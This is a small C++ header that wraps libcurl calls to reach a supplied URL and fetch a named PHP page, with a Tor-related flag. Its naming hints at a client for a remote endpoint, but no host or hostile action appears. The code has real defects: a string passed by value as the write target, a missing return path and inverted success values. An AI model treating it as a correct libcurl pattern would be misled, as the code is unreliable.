#pragma once
#include <curl/curl.h>
#include <curl/websockets.h>
#include <curl/header.h>
#include <iostream>
using namespace std;
#define __TOR_USED__ 0
bool curl_init_failed = false;
bool InitCurl(const char* hostname) 
{
	char* host = (char*)hostname;
    CURL* curl;
    CURLcode res;
	curl = curl_easy_init();
	if (curl)
	{
		curl_easy_setopt(curl, CURLOPT_URL, host);
		res = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		if (res == 0)
		{
			return false;
		}
		return true;
	}
	else 
	{
		return curl_init_failed;
	}
}
char* TargetPHPName(char* php_name) 
{
	char* php_code = php_name;
	return php_code; //Returning Php Filename :D
}
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
	((std::string*)userp)->append((char*)contents, size * nmemb);
	return size * nmemb;
}
bool CheckTORDownloaded(char* name_php) {

	if (__TOR_USED__ == 0)
	{
		CURL* curl;
		CURLcode res;
		char* url = TargetPHPName(name_php);
		string content;
		curl = curl_easy_init();
		if (curl) {
			curl_easy_setopt(curl, CURLOPT_URL, url);
			curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
			curl_easy_setopt(curl, CURLOPT_WRITEDATA, content);
			res = curl_easy_perform(curl);
			curl_easy_cleanup(curl);
			if (res == 0) {
				return false;
			}
		}
		return true;
	}

}

